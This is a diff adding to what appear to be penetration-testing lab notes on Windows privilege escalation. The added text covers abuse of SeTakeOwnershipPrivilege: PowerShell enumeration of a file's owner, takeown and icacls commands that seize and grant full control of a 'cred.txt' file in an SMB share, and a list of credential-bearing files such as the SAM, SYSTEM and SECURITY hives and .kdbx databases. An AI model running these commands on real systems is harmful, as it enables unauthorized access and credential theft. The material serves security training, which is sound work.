@@ -64,3 +64,47 @@ This privilege assigns `WRITE_OWNER` rights over any securable object.
 - `Import-Module .\Enable-Privilege.ps1`
 - `.\EnableAllTokenPrivs.ps1`
 
+##### Choosing a Target File
+
+Scenario: We can list the contents in a `private` SMB share but cannot read most files from it.
+Our account has the `SeTakeOwnershipPrivilege` enabled. Be cautious, as taking ownership 
+of certain files run by applications can break them.
+
+##### Enumeration:
+```
+gci -path 'c:\department shares\private\IT\cred.txt' | 
+select fullname,lastwritetime,attributes,@{name="Owner";expression={
+(get-acl $_.FullName).Owner}}
+```
+
+
+##### Checking File's Ownership and Taking it
+
+`cmd /c dir /q 'C:\Department Shares\Private\IT'`
+`takeown /f 'C:\Department Shares\Private\IT\cred.txt'`
+
+##### Modifying the File's ACL
+
+We may still not be able to read the file and need to modify the ACL:
+`icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F`
+
+## Files of Interest
+
+Some local files of interest may include:
+```
+C:\inutpub\wwwroot\web.config
+%WINDIR%\repair\sam
+%WINDIR%\repair\system
+%WINDIR%\repair\software
+%WINDIR%\repair\security
+
+%WINDIR%\system32\config\SecEvent.Evt
+%WINDIR%\system32\config\default.sav
+%WINDIR%\system32\config\security.sav
+%WINDIR%\system32\config\software.sav
+%WINDIR%\system32\config\system.sav
+
+.kdbx files
+password files, etc.
+```
+
